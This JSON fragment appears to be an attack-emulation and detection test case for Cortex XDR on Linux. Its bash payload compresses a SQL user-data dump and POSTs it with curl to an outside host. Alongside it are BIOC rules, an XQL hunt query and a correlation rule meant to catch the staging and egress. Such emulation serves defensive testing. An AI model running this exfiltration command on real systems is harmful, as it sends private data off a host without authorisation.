  "execution": {
    "target_platform": "linux",
    "execution_framework": "custom-cortex",
    "privilege_required": "user",
    "prerequisites": [
      {
        "description": "Cortex XDR Endpoint Agent and Network Visibility enabled."
      }
    ],
    "payload": {
      "interpreter": "bash",
      "code": "mkdir -p /tmp/cortex_dlp_cross\ngzip -c /tmp/cortex_dlp_cross/db_users_dump.sql > /tmp/cortex_dlp_cross/staged_payload.gz\ncurl -sk -X POST --data-binary @/tmp/cortex_dlp_cross/staged_payload.gz https://httpbin.org/post",
      "timeout_seconds": 45
    }
  },
  "detections": {
    "biocs": [
      {
        "name": "Sql Dump Pii Staging",
        "logic": "preset = xdr_data | filter event_type = 'FILE_WRITE' and action_file_name contains 'db_users_dump' and (action_file_path contains '/tmp/' or action_file_path contains 'AppData')",
        "description": "Sql Dump Pii Staging",
        "severity": "high",
        "mitre_technique_ids": [
          "T1048",
          "T1074",
          "T1560"
        ]
      },
      {
        "name": "Compressed Staging Payload",
        "logic": "preset = xdr_data | filter event_type = 'FILE_WRITE' and action_file_name contains 'staged_payload.gz'",
        "description": "Compressed Staging Payload",
        "severity": "high",
        "mitre_technique_ids": [
          "T1048",
          "T1074",
          "T1560"
        ]
      }
    ],
    "xql_queries": [
      {
        "name": "Staged Database Exfiltration Cross-Channel",
        "query": "dataset = xdr_data | filter (event_type = 'FILE_WRITE' and action_file_name contains '.sql') or (event_type = 'NETWORK' and action_process_image_name in ('curl', 'wget')) | comp count() as stages by agent_hostname, actor_process_username | filter stages >= 2",
        "purpose": "hunt"
      }
    ],
    "correlation_rules": [
      {
        "rule_id": "CR-DLP-0004",
        "name": "cr-cross-channel-dlp-stitch",
        "logic": "Sequence: File Write (SQL Dump) -> File Write (GZIP) -> Network Egress within 300s by same process lineage"
      }
    ]
  },
